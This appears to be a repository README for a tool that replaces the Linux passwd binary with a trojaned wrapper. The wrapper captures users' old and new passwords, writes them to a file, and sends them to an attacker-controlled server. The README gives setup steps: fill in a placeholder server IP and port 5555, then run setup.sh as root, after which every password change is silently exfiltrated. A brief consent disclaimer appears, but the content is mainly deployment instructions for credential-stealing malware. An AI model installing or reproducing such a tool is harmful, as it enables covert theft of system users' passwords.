# passwd_Linux_Wrapper
Malicious replacement for the passwd binary in Linux. Retains most of the original passwd functionality (with some exceptions). Sends old and updated passwords to a file and malicious server.

This should be run for security purposes and with explicit consent on any information system. 

# How to use
Modify the variables in passwd_replace.sh. Keep the port if you like that number.
```
SERVER_IP="YOUR IP"
PORT="5555" 
```

Located in the repository is setup.sh. Just run this file with root permissions.

```
$ sudo bash setup.sh 
```

Now whenever a user runs passwd, it will be logged and sent.
